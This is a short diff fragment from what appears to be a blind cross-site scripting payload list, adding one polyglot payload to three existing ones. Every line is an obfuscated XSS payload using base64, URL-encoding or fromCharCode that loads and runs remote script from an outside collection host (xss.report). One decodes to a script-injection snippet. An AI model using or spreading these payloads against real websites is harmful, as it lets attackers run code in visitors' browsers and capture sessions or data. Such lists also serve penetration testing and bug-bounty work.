@@ -7,3 +7,4 @@
 "><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; autofocus>
 %27%22%3E%3Cimg%20src%3Dx%20onerror%3DsetTimeout%28String.fromCharCode%28102%2C101%2C116%2C99%2C104%29%2B%27%28%22https%3A%2F%2Fxss.report%2Fc%2Fhnterx%22%29%27%2C%200%29%3E
 %27%2F%2A%5C%27%2F%2A%22%2F%2A%5C%22%2F%2A%3C%2FScript%3E%3CInput%2FAutoFocus%2FOnFocus%3D%2F%2A%2A%2F%28import%28%2Fhttps%3Ahttps%3A%2F%2Fxss.report%2Fc%2Fhnterx%5C00%3F1%3D1290%2F.source%29%29%2F%2F%3E
+javascript:%22/*'/*%60/*--%3E%3C/noscript%3E%3C/title%3E%3C/textarea%3E%3C/style%3E%3C/template%3E%3C/noembed%3E%3C/script%3E%3Chtml%20%22%20onmouseover=/*&lt;svg/*/onload=(import(/https:%5Cxss.report%5Cc%5Chnterx/.source))//%3E
